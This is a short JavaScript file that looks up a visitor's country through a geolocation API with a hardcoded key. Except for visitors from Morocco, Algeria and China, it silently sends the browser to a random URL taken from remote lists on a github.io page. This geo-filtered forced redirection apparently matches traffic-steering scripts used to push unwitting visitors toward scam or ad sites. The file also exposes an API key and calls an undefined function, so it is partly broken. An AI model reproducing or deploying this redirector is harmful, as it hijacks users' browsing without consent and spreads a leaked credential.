const jsonUrls = [
    'https://pro.ip-api.com/json/?key=6KddQSe576qrfNb'
];

// Fetch country information from a randomly selected JSON URL
const randomIndex = Math.floor(Math.random() * jsonUrls.length);
const randomUrl = jsonUrls[randomIndex];

// Fetch country information using a third-party API
fetch(randomUrl)
    .then(response => response.json())
    .then(data => {
        let countryCode;
    
        // Check if the response contains country code
        if (data.ip.country_code) {
            countryCode = data.ip.country_code;
            console.log('country:', countryCode);
        }

        else if (data.country_code) {
            countryCode = data.country_code;
            console.log('country_code:', countryCode);
        }
        else if (data.countryCode) {
            countryCode = data.countryCode;
            console.log('country_code:', countryCode);
        }
        else if (data.country_code2) {
            countryCode = data.country_code2;
            console.log('country_code:', countryCode);
        }
        // Check if the response contains country
        else if (data.country) {
            countryCode = data.country;
            console.log('country:', countryCode);
        }
    
        // Perform country-based redirection using country code or country
        performCountryRedirection(countryCode);
        })
    .catch(error => {
        // Handle error if the API request fails
        console.error('Error:', error);
        // Redirect to a default page if the country detection fails
        redirectToRandomUrl();
        });

// Function to perform country-based redirection
function performCountryRedirection(countryCode) {
    if (countryCode === 'GB') {
        fetchUrls('https://hellonetwork2023.github.io/uk/ukurls.json');
      } else if (countryCode === 'MA' || countryCode === 'DZ' || countryCode === 'CN') {
        return;
      }else {
        fetchUrls('https://hellonetwork2023.github.io/us/usurls.json');
      }
    }

function fetchUrls(jsonFile) {
    fetch(jsonFile)
    .then(response => response.json())
    .then(data => {
        const urls = data.urls.map(site => site.url);
        const randomIndex = Math.floor(Math.random() * urls.length);
        const randomUrl = urls[randomIndex];
        setTimeout(function () {
            window.location.href = randomUrl;
        }, 700);
    })
    .catch(error => {
        console.error('Error:', error);
    });
}
